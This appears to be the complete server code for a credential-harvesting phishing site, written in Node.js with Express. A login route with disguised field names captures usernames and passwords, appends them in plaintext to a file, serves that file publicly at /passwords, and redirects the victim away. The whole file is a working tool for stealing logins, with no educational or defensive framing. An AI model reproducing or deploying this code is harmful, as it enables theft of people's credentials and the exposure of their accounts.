const express = require('express');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express()
const port = 8005

const getReport = (user, pass) => {
  const currentDate = (new Date()).toString();
  return `## Login at ${currentDate} ##
USER: ${user}
PASS: ${pass}
--
`;};

app.use('/page', express.static('page'));
app.use('/passwords', express.static('data/passwords.txt'));

app.use('/login', bodyParser.urlencoded({ extended: true }));
app.post('/login', (req, res) => fs.appendFile(
  path.resolve('.', 'data', 'passwords.txt'),
  getReport(req.body.fkllgn, req.body.fklpwd),
  (err) => {
    if (err) throw err;
    console.log('new login saved');

    res.writeHead(301, {'Location': 'http://localhost'});
    res.send();
  }
))

app.listen(port, () => console.log(`Example app listening on port ${port}!`));
